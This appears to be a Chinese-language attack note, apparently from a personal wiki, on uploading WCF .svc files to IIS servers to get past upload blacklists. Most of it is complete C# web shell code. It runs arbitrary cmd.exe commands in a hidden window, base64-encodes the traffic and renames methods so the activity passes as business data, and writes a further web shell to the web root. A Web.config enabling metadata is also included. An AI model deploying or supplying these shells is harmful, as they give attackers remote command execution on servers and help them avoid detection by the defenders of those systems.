基本都会有[ServiceContract]关键字<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664248221846-5707d096-8405-4463-9e2a-93571632ec77.png#clientId=ucfedfd0f-fec5-4&from=paste&height=302&id=u9ec8d0c4&originHeight=309&originWidth=442&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34891&status=done&style=none&taskId=ued93fa9a-95fb-4952-94b7-ddd0fb73595&title=&width=432.6000061035156)

<a name="qc2oC"></a>
## svc命令执行脚本
实战中绕过黑名单可以上传svc脚本<br />test.svc
```
<%@ ServiceHost Language="C#" Debug="true" Service="Service" %>
using System;
using System.Web;
using System.IO;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;
using System.ServiceModel.Activation;
using System.Collections.Generic;
using System.Configuration;
using System.ServiceModel.Web;
using System.Diagnostics;

[ServiceContract]
    public interface IService1
    {

        [OperationContract]
        string cmdShell(string value);

        // TODO: 在此添加您的服务操作
    }

public class Service : IService1
{
public string cmdShell(string text) {
		Process pr = new Process();
        pr.StartInfo.FileName = "cmd.exe";
        pr.StartInfo.RedirectStandardOutput = true;
        pr.StartInfo.UseShellExecute = false;
        pr.StartInfo.Arguments = "/c " + text;
        pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        pr.Start();
        StreamReader osr = pr.StandardOutput;
        String ocmd = osr.ReadToEnd();
        osr.Close();
        osr.Dispose();
        return ocmd;
    }

}
```

Web.config
```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.serviceModel>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <!-- 为避免泄漏元数据信息，请在部署前将以下值设置为 false -->
          <serviceMetadata httpGetEnabled="true" httpsGetEnabled="true"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
</configuration>

```
两个上传之后，同目录的，wsdl解码就可以命令执行了<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664248733954-89c04cc7-ffb1-40de-981c-53d0877a9072.png#clientId=ucfedfd0f-fec5-4&from=paste&height=604&id=u46cfa027&originHeight=755&originWidth=1339&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64928&status=done&style=none&taskId=u5f2a9179-bf23-4cc3-be97-d3669e1991b&title=&width=1071.2)
<a name="WFQDT"></a>
## 编码流量伪装
请求包的cmdshell函数名太惹眼了，改一下编码输入和输出
```
<%@ ServiceHost Language="C#" Debug="true" Service="Service" %>
using System;
using System.Web;
using System.IO;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;
using System.ServiceModel.Activation;
using System.Collections.Generic;
using System.Configuration;
using System.ServiceModel.Web;
using System.Diagnostics;

[ServiceContract]
    public interface IService1
    {

        [OperationContract]
        string cmdShell(string value);

        // TODO: 在此添加您的服务操作
    }

public class Service : IService1
{
public string cmdShell(string text) {
		byte[] outputb = Convert.FromBase64String(text);
		string str1 = Encoding.Default.GetString(outputb);
		Process pr = new Process();
        pr.StartInfo.FileName = "cmd.exe";
        pr.StartInfo.RedirectStandardOutput = true;
        pr.StartInfo.UseShellExecute = false;
        pr.StartInfo.Arguments = "/c " + str1;
        pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        pr.Start();
        StreamReader osr = pr.StandardOutput;
		String ocmd = osr.ReadToEnd();
		
		byte[] bytes = Encoding.Default.GetBytes(ocmd);
		string str = Convert.ToBase64String(bytes);
        osr.Close();
        osr.Dispose();
        return str;
    }

}
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664346861634-32dcfe80-8943-44be-8f50-0cf1baf92def.png#clientId=udb993fdc-d10b-4&from=paste&height=636&id=ucc981f57&originHeight=795&originWidth=1677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68589&status=done&style=none&taskId=u39fdf587-0829-4a26-aeb4-96df6cddc0a&title=&width=1341.6)<br />把cdmshell改一下名字，就更隐秘了，实战中就可以伪装成业务数据流量穿梭了。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664347779696-81d857dc-9fa4-4dfe-a8ba-4bce9679d0bc.png#clientId=uf4fd4b91-b5cb-4&from=paste&height=414&id=ua0e96b2a&originHeight=518&originWidth=1859&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31257&status=done&style=none&taskId=u8c8e6cd9-d602-4e7f-a32f-3f34bccbf39&title=&width=1487.2)

<a name="CE1HQ"></a>
## webshell写入
```
<%@ ServiceHost Language="C#" Debug="true" Service="Service" %>
using System;
using System.Web;
using System.IO;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;
using System.ServiceModel.Activation;
using System.Collections.Generic;
using System.Configuration;
using System.ServiceModel.Web;
using System.Diagnostics;

[ServiceContract]
    public interface IService1
    {

        [OperationContract]
        string webapi(string value);

		[OperationContract]
		string Createfile(string filepath,string filevalue);
        // TODO: 在此添加您的服务操作
    }

public class Service : IService1
{
public string webapi(string text) {
		byte[] outputb = Convert.FromBase64String(text);
		string str1 = Encoding.Default.GetString(outputb);
		Process pr = new Process();
        pr.StartInfo.FileName = "cmd.exe";
        pr.StartInfo.RedirectStandardOutput = true;
        pr.StartInfo.UseShellExecute = false;
        pr.StartInfo.Arguments = "/c " + str1;
        pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        pr.Start();
        StreamReader osr = pr.StandardOutput;
		String ocmd = osr.ReadToEnd();
		
		byte[] bytes = Encoding.Default.GetBytes(ocmd);
		string str = Convert.ToBase64String(bytes);
        osr.Close();
        osr.Dispose();
        return str;
    }
public string Createfile(string filepath,string filevalue) {
		var a = filepath;
		byte[] outputb = Convert.FromBase64String(filevalue);
		string str1 = Encoding.Default.GetString(outputb);
		System.IO.File.WriteAllText(filepath,str1);
        return a;
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664357675977-37437417-b97a-44fd-88c8-025ee9f1bb57.png#clientId=ud08609fc-9bb8-4&from=paste&height=70&id=u91084e4e&originHeight=88&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5861&status=done&style=none&taskId=udbbd71b9-1715-4ca8-8046-337c770e522&title=&width=901.6)<br />filepath要通过命令执行去找到web的物理路径，然后传入完整的路径<br />filevalue用base64传值，是webshell的木马内容<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664357516453-0709ae94-59fa-4a05-93f2-6d35036a8d7c.png#clientId=ud08609fc-9bb8-4&from=paste&height=572&id=ufb2d7a6d&originHeight=715&originWidth=1654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55812&status=done&style=none&taskId=u80fb3233-d5f8-43b6-85f7-635e4e85230&title=&width=1323.2)
